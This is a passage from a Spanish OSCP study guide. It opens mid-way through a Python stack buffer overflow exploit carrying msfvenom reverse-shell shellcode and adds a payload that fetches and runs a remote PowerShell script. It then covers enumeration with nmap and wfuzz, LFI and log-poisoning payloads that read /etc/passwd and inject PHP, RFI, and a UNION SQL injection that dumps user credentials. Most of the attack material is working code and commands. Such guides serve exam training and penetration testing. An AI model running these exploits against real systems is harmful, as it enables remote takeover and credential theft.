"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
"\xc0\x8a\x41\xbe\xe1\x9e")

buffer = "A"*809 + "B"*4 + "\x90"*16 + shellcode + "C"*(1300-809-4-16-351)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```
La razón por la cual se han insertado los **NOP-sled** (\x90) antes de nuestro Shellcode, es porque el Shellcode necesita un margen de espacio para ser decodificado antes de ser interpretado, pues hemos usado el encoder x86/shikata_ga_nai. Una buena practica es aprovechar el **Immunity Debugger** para analizar instrucción a instrucción cómo se va produciendo el proceso de decodificación, así como probar a no insertar los NOP-sled a fin de corroborar como la ejecución de nuestro Shellcode no es funcional.

Ya teniendo todo esto hecho, lo único que queda es encontrar una dirección de salto al registro ESP.

#### Salto al ESP

Llegando casi al final, para redirigir el flujo del programa y conseguir una ejecución exitosa de nuestro Shellcode, dado que nuestro Shellcode se sitúa en el registro **ESP** por un lado y dado que tenemos el control del registro **EIP** por otro... la idea es hacer que el registro **EIP** apunte hacia el registro **ESP**.

Para ello, no es tan simple como especificar en _Little Endian_ la dirección del registro **ESP**, pues no funcionará. Lo que tendremos que hacer es lograr que el registro EIP apunte hacia una dirección de la memoria con permisos de ejecución y **ASLR** desactivado donde se aplique una instrucción de tipo '**jmp ESP**'. De esta forma, conseguiremos tras apuntar a dicha dirección, que la siguiente instrucción a realizar corresponda a los **NOP's** iniciales del registro **ESP** hasta llegar a nuestro **Shellcode**.

Para ello, lo que tendremos que hacer una vez sincronizados al proceso desde **Immunity Debugger**, es aplicar el siguiente comando en la línea de comandos interactiva de la herramienta:

`!mona modules`

Una vez hecho, se nos listarán un puñado de módulos, de entre los cuales deberemos buscar cuáles no poseen mecanismos de protección y tienen el ASLR desactivado. Para la examinación del OSCP, siempre habrá uno que reúna dichas condiciones.

Tras encontrar el módulo, desde las pestañas superiores en **Immunity Debugger** (las letras iniciales), una de ellas nos permite visualizar si el campo _.text_ del módulo en la memoria tiene permisos de ejecución, en caso de ser así, el módulo seleccionado es un candidato perfecto.

La idea una vez teniendo el módulo candidato, es ver en qué porción de la memoria se está aplicando un salto al registro ESP. Para realizar esta búsqueda, analizamos el equivalente OPCode de la instrucción haciendo uso para ello de la utilidad **nasm_shell.rb** de Metasploit:

```bash
$~ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm > jmp esp
00000000  FFE4              jmp esp
nasm >

```

Sabiendo que a nivel de OPCode, un '**jmp ESP**' figura como **FFE4**, podemos a continuación desde Mona en la línea de comandos interactiva de **Immunity Debugger** realizar la siguiente consulta en la sección de módulos:

`find -s "\xff\xe4" -m modulo.dll`

Suponiendo que se trata de una dll el módulo candidato que hemos encontrado. De manera inmediata, se nos datarán un listado de resultados, donde de entre ellos... deberemos seleccionar aquel cuya dirección de memoria no posea badchars.

Haciendo doble-click en la misma, podremos ver desde la interfaz principal de **Immunity Debugger** como dicha dirección equivale a un jmp ESP. A modo de ejemplo, suponiendo que la dirección es **0x12131415**, se deberían de aplicar al script los siguientes cambios:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
"\xc0\x8a\x41\xbe\xe1\x9e")

buffer = "A"*809 + "\x15\x14\x13\x12" + "\x90"*16 + shellcode + "C"*(1300-809-4-16-351)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```

Consiguiendo así que el registro **EIP** apunte a dicha dirección donde posteriormente se aplica el salto al registro **ESP**.

Una manera más elegante y opcional de hacer las cosas es importando la siguiente librería en el script:

```python
from struct import pack
```

La funcionalidad del **pack** nos permite poner en formato _Little Endian_ una dirección pasada directamente sin tener que estar haciendo la conversión manualmente. Para ello, se debería adaptar el script a lo que se muestra a continuación:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket
from struct import pack

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
"\xc0\x8a\x41\xbe\xe1\x9e")

buffer = "A"*809 + "B"*4 + pack('<L', 0x12131415) + shellcode + "C"*(1300-809-4-16-351)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```

Podemos establecer **BreakPoints** desde Immunity Debugger en dicha dirección (pulsando **F2** para ello sobre la dirección), a fin de corroborar que se produce una detención en la ejecución del programa tras el registro **EIP** pasar por la dirección **0x12131415**. En caso de ser así, esto quiere decir que todo ha sido configurado correctamente, donde de pulsar la tecla **F8** una vez alcanzado el breakpoint, vemos que la siguiente instrucción a realizar corresponde al primer **NOP-sled** del registro **ESP**.

Ya con todo esto hecho, tras la ejecución del exploit teniendo una sesión de escucha previa con netcat en el puerto definido... ganaremos acceso al sistema, con la desventaja de que una vez matada la sesión, en caso de volver a ejecutar el script... no ganaremos más veces acceso al sistema, pues el servicio corrompe. Arreglaremos esto en el siguiente punto.


#### Mejorando el Exploit

De forma opcional, en caso de querer tras la ejecución del exploit poder continuamente acceder al sistema sin que el servicio corrompa, lo único que tenemos que hacer como variante al generar nuestro shellcode es lo siguiente:

```
$~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
```
De esta forma, variamos la función de salida a un modo hilo... haciendo que lo que muera sea el hilo en vez del proceso padre. El Shellcode generado tendrá el mismo tamaño (351 bytes), lo único que habrá que hacer será sutituir el Shellcode por el nuevo generado desde msfvenom.

Tras su ejecución, se podrá comprobar como independientemente del número de veces que se ejecute el exploit, ganaremos siempre acceso al sistema.

#### Reduciendo el Size y Acceso por Powershell

En caso de que nuestro **Size** en el **ESP** antes de que el servicio crashee de otra forma no llegue a los 351 bytes, podemos utilizar un pequeño truco que obtuve haciendo pruebas para reducir el tamaño de nuestro Shellcode.

La idea para este caso, va a ser obtener una sesión reversa TCP vía **Powershell** aprovechando la utilidad de **Nishang**, concretamente la utilidad **Invoke-PowerShellTcp.ps1**. Dado que resultaría tedioso transferir el script, posteriormente dar una instrucción de importación y luego otra de invocación... lo que haremos será hacerlo todo de una, añadiendo en la última línea del script el siguiente contenido:

`Invoke-PowerShellTcp -Reverse -IPAddress nuestraIP -Port 443`

De esta forma, nos aprovecharemos de **msfvenom** para generar una sentencia como la siguiente:

```bash
$~ msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://127.0.0.1:8000/PS.ps1')" -f c -a x86 --platform windows EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d"

Payload size: 299 bytes
Final size of c file: 1280 bytes
unsigned char buf[] = 
"\xd9\xcb\xbf\xbe\xfd\xc8\xaf\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x45\x31\x7e\x17\x03\x7e\x17\x83\x50\x01\x2a\x5a\x50\x12\x29"
"\xa5\xa8\xe3\x4e\x2f\x4d\xd2\x4e\x4b\x06\x45\x7f\x1f\x4a\x6a"
"\xf4\x4d\x7e\xf9\x78\x5a\x71\x4a\x36\xbc\xbc\x4b\x6b\xfc\xdf"
"\xcf\x76\xd1\x3f\xf1\xb8\x24\x3e\x36\xa4\xc5\x12\xef\xa2\x78"
"\x82\x84\xff\x40\x29\xd6\xee\xc0\xce\xaf\x11\xe0\x41\xbb\x4b"
"\x22\x60\x68\xe0\x6b\x7a\x6d\xcd\x22\xf1\x45\xb9\xb4\xd3\x97"
"\x42\x1a\x1a\x18\xb1\x62\x5b\x9f\x2a\x11\x95\xe3\xd7\x22\x62"
"\x99\x03\xa6\x70\x39\xc7\x10\x5c\xbb\x04\xc6\x17\xb7\xe1\x8c"
"\x7f\xd4\xf4\x41\xf4\xe0\x7d\x64\xda\x60\xc5\x43\xfe\x29\x9d"
"\xea\xa7\x97\x70\x12\xb7\x77\x2c\xb6\xbc\x9a\x39\xcb\x9f\xf0"
"\xbc\x59\x9a\xb7\xbf\x61\xa4\xe7\xd7\x50\x2f\x68\xaf\x6c\xfa"
"\xcc\x4f\x8f\x2e\x39\xf8\x16\xbb\x80\x65\xa9\x16\xc6\x93\x2a"
"\x92\xb7\x67\x32\xd7\xb2\x2c\xf4\x04\xcf\x3d\x91\x2a\x7c\x3d"
"\xb0\x5a\xed\xb6\x5e\xe8\x82\x50\xc4\x60\x09\x81\x4f\x3d\x89"
"\xe9\x01\xd8\x5e\xc7\xd2\x40\xcb\x72\x8e\xf0\x2b\x33\x35\x8c"
"\x05\x9c\xd0\x0e\x19\x4e\x72\xab\xf3\xfa\xad\x1d\x68\x6c\xd9"
"\x0f\x1c\x1d\x44\xab\x8f\x95\xf4\x5a\x5e\x31\xd1\xbb\xf6\xc9"
"\x55\xb3\x3c\x1d\xb9\x02\x73\x56\xeb\x54\x5d\xa8\xdd\xa5\x9b"
"\xf0\x11\xf5\xeb\x2f\x02\xa6\x25\x40\xd1\x79\x1d\x89\x15";
```

Como vemos, en este caso en hemos pasado de 351 bytes a 299 bytes. Lo que se debe hacer para acceder al sistema en este caso es simplemente compartir un servidor vía Python en el puerto 8000 (para que desde la máquina se interprete el fichero PS.ps1 [Le hemos cambiado el nombre para reducir los bytes]), y dejar una sesión de escucha vía Netcat por el puerto 443.

Inmediatamente tras ejecutar el script, veremos cómo se recibe un GET desde nuestro servidor web vía Python y cómo en cuestión de segundos ganamos acceso al sistema vía Powershell.

Buffer Overflow Linux
===============================================================================================================================

Hasta donde yo se, nunca ha caído un _Buffer Overflow_ de Linux, pero por si las moscas, detallo el procedimiento usando como ejemplo el aplicativo **Crossfire**.

#### Fuzzing




Pentesting
===============================================================================================================================

En este punto, se detallan técnicas de Pentesting a abordar sobre las máquinas Windows/Linux que se nos presenten.

### General

Bajo este apartado se describirán técnicas de enumeración a realizar sobre los Hosts independientemente del sistema operativo / servicio con el que se trate.

#### Port Scanning

Cada uno tiene su forma de hacer la enumeración de puertos/servicios corriendo bajo un sistema. Yo generalmente suelo seguir estos pasos.

* Escaneo inicial de puertos abiertos sobre el sistema

```bash
nmap -p- --open -T5 -v -oG allPorts ipHost -n
```
* Enumeración del servicio y versionado para los puertos descubiertos sobre el sistema

```bash
nmap -p$(cat allPorts | grep -oP '\d{2,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',') -sC -sV ipHost -oN targeted
```

La razón de hacer esto es que me parece mucho más ágil el poder tener una visual de los puertos abiertos de un primer tirón para el escaneo inicial, así en lo que posteriormente lanzo el profundo de enumeración de servicios con los scripts básicos de enumeración, puedo ir enumerando por mi cuenta los puertos que corren servicios conocidos (HTTP, HTTPS, FTP, ms-sql-s, etc.).

* En caso de contar con un escaneo inicial lento, suelo aplicar la siguiente variante

```bash
nmap -A -T4 -v ipHost -oN misc
```

Este escaneo no engloba todos los puertos, y probablemente nos estemos saltando algunos interesantes que escapen de este escaneo. En tal caso podemos ir englobando rangos de búsqueda a fin de determinar los puertos que están abiertos (Pues lanzando el -p- cuando se demora mucho tiempo nmap suele detener el escaneo haciéndolo incompleto):

```bash
nmap -p1-10000 --open -T5 -v ipHost -n -oG range1-10000
nmap -p10000-20000 --open -T5 -v ipHost -n -oG range10000-20000
nmap -p20000-30000 --open -T5 -v ipHost -n -oG range20000-30000
                        .
                        .
                        .
```

En caso de figurar un servicio HTTP corriendo bajo un puerto, podemos aprovecharnos del script **http-enum.nse** de nmap para enumerar directorios y archivos del servicio web (Cuenta con un diccionario pequeño pero nos puede servir para tener una visual rápida sobre los recursos alojados):

```bash
nmap --script=http-enum.nse -p80,443,8080 ipHost -oN webScan
```

* Visualización de categorías para los scripts de nmap

```bash
grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"' | sort -u
```

Estas categorías son todas las que nmap posee, pudiendo por ejemplo para un servicio FTP o SMB aplicar las siguientes categorías:

```bash
nmap -p21,445 --script="vuln and safe" ipHost -oN vulnSafeScan
```

En cuanto a los **Low Hanging Fruit**, puertos interesantes a buscar para nuestros escaneos iniciales pueden ser los siguientes (Hay muchos más, pero corresponden a servicios que nos pueden garantizar la ejecución de comandos en remoto sobre los sistemas):

```bash
nmap -p21,1433 192.168.1.0/24 --open -T5 -v -n -oN LHF
```

Sobre el servicio **FTP** resulta interesante comprobar que podamos subir archivos. En caso de contar con un IIS, si vemos que somos capaces de alojar un fichero asp/aspx y apuntar al mismo desde el servicio web, podremos entablar una conexión TCP reversa.

Sobre el servicio **ms-sql-s**, una de las pruebas que suelo utilizar de cabeza es la de realizar una autenticación vía **sqsh** contra el servicio proporcionando las credenciales **sa** de usuario sin contraseña. Puede llegar a pasar que el servicio no se encuentre corriendo sobre el puerto 1433, en ese caso podemos hacer uso de la herramienta [mssql.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)

#### Wfuzz

Aunque también se puede hacer uso de **Dirbuster**, siempre he sido más partidiario de lidiar con **Wfuzz**. La sintaxis general para la búsqueda de directorios que empleo es la siguiente:

```bash
wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.1.X/FUZZ
```

En caso de querer recorrer un rango numérico, por ejemplo para un caso práctico donde vemos que contamos con un servicio web desde el cual podemos hacer consultas a otro servicio web, algo que podemos hacer es aprovechar dicha funcionalidad para enumerar puertos internos que corran sobre el sistema desde el cual estamos aplicando las consultas.

Esta parte me recuerda sobre todo a una máquina de HackTheBox, donde figuraba ciertos servicios HTTP corriendo que no eran accesibles desde fuera de la máquina. Con el objetivo de determinar estos puertos, podemos atender a los códigos de estado del lado de la respuesta del servidor, ocultando por ejemplo el código de estado 404:

```bash
wfuzz -c --hc=404 -z range,1-65535 http://192.168.1.X:8080/request_to=http://127.0.0.1:FUZZ
```

De esta forma, se nos mostrará únicamente resultados donde se devuelva un código de estado diferente al 404.

De manera alternativa, también podríamos haber aplicado lo siguiente:

```bash
wfuzz -c --sc=200 -z range,1-65535 http://192.168.1.X:8080/request_to=http://127.0.0.1:FUZZ
```

Para mostrar peticiones que devuelvan un 200 cómo código de estado. Al igual que el código de estado se pueden jugar con más parámetros de filtro, como los caracteres, el número total de líneas, etc.

**Importante:** A la hora de obtener un **Forbidden** en el código de estado de la respuesta del lado del servidor, recomiendo no tirar la toalla... pues a pesar de figurarnos dicha respuesta, podemos seguir enumerando directorios y archivos dentro de dicho directorio, donde tras dar con recursos válidos vemos que estos son visibles desde la web.

Para tener un caso práctico, supongamos que tenemos un directorio **/design** que nos devuelve un Forbidden. Algo que podemos hacer es configurar una enumeración de doble Payload desde wfuzz a fin de descubrir recursos existentes bajo dicho directorio.

Para ello, nos creamos un fichero _extensions.txt_ con el siguiente contenido:

```bash
php
txt
html
xml
cgi
```

Posteriormente, hacemos uso de Wfuzz siguiendo la siguiente sintaxis:

`wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z file,extensions http://192.168.1.X/design/FUZZ.FUZ2Z`

De esta forma, estaremos para cada una de las líneas del payload principal comprobando las extensiones especificadas sobre el segundo payload.

#### Nikto

Sinceramente no he llegado a profundizar mucho sobre esta herramienta, pero dado que forma parte de una de las herramientas de automatización que admiten en el examen y a veces devuelve maravillas... detallo su uso:

`nikto -h http://192.168.1.X`

### Pentesting Web

#### LFI

Esta vulnerabilidad nos permite visualizar recursos del sistema efectuando para ello un **Directory Path Transversal**.

A modo de ejemplo, presento a continuación un script en PHP con dicha vulnerabilidad:

```php
<?php
    $file = $_REQUEST['file'];
    echo include($file);
?>
```

Suponiendo que el fichero se llama _file.php_, si desde la URL efectuamos la siguiente búsqueda:

`http://localhost/file.php?file=/etc/passwd`

Veremos cómo se nos lista el fichero passwd del equipo Linux local. Habrán ocasiones en las que tengamos que recorrer un par de directorios hacia atrás para visualizar el recurso:

`http://localhost/file.php?file=../../../../../etc/passwd`

Así como incorporar un **%00** para el bypassing de restricciones implementadas:

`http://localhost/file.php?file=../../../../../etc/passwd%00`

Por [aquí](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal) os dejo un buen recurso para el uso de Wrappers y otras técnicas de bypassing.

#### LFI to RCE

Existen varias formas de conseguir ejecutar comandos en remoto a través de un **Local File Inclusion**, así como de acceder al sistema a través de la visualización de ciertos recursos. Para este caso, explicaré 3 técnicas a modo de ejemplo.

* Log Poisoning (access.log & auth.log)
* Mail PHP Execution
* SSH Access via id_rsa Access Key

La primera de ellas [**Log Poisoning**], consiste en verificar si las rutas _/var/log/auth.log_ y _/var/log/apache2/access.log_ son visibles desde el **LFI**.

En caso de serlo para la ruta _/var/log/auth.log_, podemos llevar a cabo técnicas de autenticación que nos permitan obtener ejecución de comandos en remoto. Esta ruta almacena las autenticaciones establecidas sobre el sistema, entre ellas además de las normales de sesión, las que van por SSH.

Esto en otras palabras se traduce en que por cada intento fallido de conexión por SSH hacia el sistema, se generará un reporte visible en el recurso _/var/log/auth.log_. La idea en este punto es aprovechar la visualización del recurso para forzar la autenticación de un usuario no convencional, donde incrustramos un código PHP que nos permite posteriormente desde el LFI ejecutar comandos sobre el sistema.

Ejemplo:

`ssh "<?php system('whoami'); ?>"@192.168.1.X`

Tras introducir una contraseña incorrecta para el usuario inexistente, se generará un reporte en el recurso _auth.log_ como el siguiente:

```bash
Nov  5 11:53:46 parrot sshd[13626]: Failed password for invalid user <?php echo system('whoami'); ?> from ::1 port 39988 ssh2
Nov  5 11:53:48 parrot sshd[13626]: Connection closed by invalid user <?php echo system('whoami'); ?> ::1 port 39988 [preauth]
```

Llegados a este punto, si desde la URL aprovechando el LFI apuntamos a dicho recurso, veremos cómo figurará un usuario '***www-data***' para el campo _whoami_ definido en el script php incrustrado a través del usuario de autenticación.

Para el caso del recurso _access.log_ pasa algo similar, sólo que en cuanto a la implementación técnica se realizarn otras operaciones.

Siempre suelo emplear Burpsuite como intermediario, pero también se puede hacer desde curl modificando el **User-Agent**. Lo que necesitamos hacer es realizar una consulta a la página web cambiando el User-Agent por un código PHP. De esta forma, tras visualizar el recurso _access.log_ de Apache, veremos como el código PHP es interpretado en el User-Agent de la petición en la respuesta del lado del servidor, pudiendo posteriormente ejecutar comandos en remoto de la misma forma que sucedía con el recurso _auth.log_.

#### RFI

Esta vulnerabilidad tiene cierta similitud que el LFI, sólo que la inclusión de archivos se produce de manera remota, permitiéndonos desde la URL vulnerable de un servicio web apuntar hacia servicios locales de nuestro equipo que estemos compartiendo.

Un buen ejemplo para practicar es la máquina **TartarSauce** de HackTheBox, donde el servicio web contaba con un plugin Gwolle vulnerable a RFI. Desde el servicio web, realizábamos la siguiente consulta desde la URL:

`http://192.168.1.X/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abs
path=http://nuestraIP/wp-load.php`

De esta forma, resulta sencillo pensar en lo fácil que puede llegar a ser para el caso descrito el acceso al sistema.

#### SQLI

Ejemplo básico aplicado sobre servicio web falso http://www.paginaweb.com/contenidos.php?Id=3

Comprobamos que la web es vulnerable a inyección SQL:

`http://www.paginaweb.com/contenidos.php?Id=-1 `

Enumeramos hasta coincidir con el número de columnas para generar las etiquetas:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,2,3,4,5-- -`

Nos aprovechamos de las etiquetas generadas para ver si somos capaces de visualizar archivos sobre el sistema, así como para saber el versionado del servicio de base de datos y el usuario que corre dicho servicio:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,select_file('/etc/passwd'),3,4,5-- -`
`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,@@version,3,4,5-- -`
`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,user(),3,4,5-- -`

Comenzamos a enumerar las tablas de la base de datos:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+0,1-- -`

Nos montamos un script en **Bash** (o en otro lenguaje) para determinar de forma rápida qué tablas existen sobre la base de datos, parseando para ello los resultados en función del caso que se nos presente:

```bash
for i in $(seq 1 200); do
    echo -n "Para el número $i: "
    curl --silent "http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+$i,1--%20-" | grep "eltitulo" | cut -d '>' -f 2 | awk '{print $1}' FS="<"
done
```

Obteniendo resultados como los siguientes:

```bash
Para el número 63: CABECERA
Para el número 64: COLABORADORES
Para el número 65: CONTENIDOS
Para el número 66: DOCUMENTOS
Para el número 67: HORARIOS
Para el número 68: IDIOMAS
Para el número 69: IMAGENES
Para el número 70: MODULOS
Para el número 71: NOTICIAS
Para el número 72: PERMISOS
Para el número 73: USUARIOS
```

Una vez localizada la tabla que nos interese (para este caso, la tabla **usuarios**), enumeramos las columnas existentes para dicha tabla en la base de datos:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_name=char(117,115,117,97,114,105,111,115)-- -`

Es necesario para este paso convertir la cadena **usuarios** de STRING a formato ASCII. Obtendremos los siguientes resultados:

`IDUSUARIO,IDEMPRESA,USUARIO,PASSWORD,NOMBRE,ADMINISTRADOR`

Una vez sabiendo los nombres de las columnas, aprovechamos la funcionalidad _group_concat_ para concatenar todas las columnas cuyos datos queramos visualizar:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(usuario,0x3a,password),3,4,5+from+usuarios--%20-`

Obteniendo el usuario y contraseña de acceso.

Antes de complicarse, preferible probar inyecciones básicas sobre paneles de autenticación, esto es:

```bash
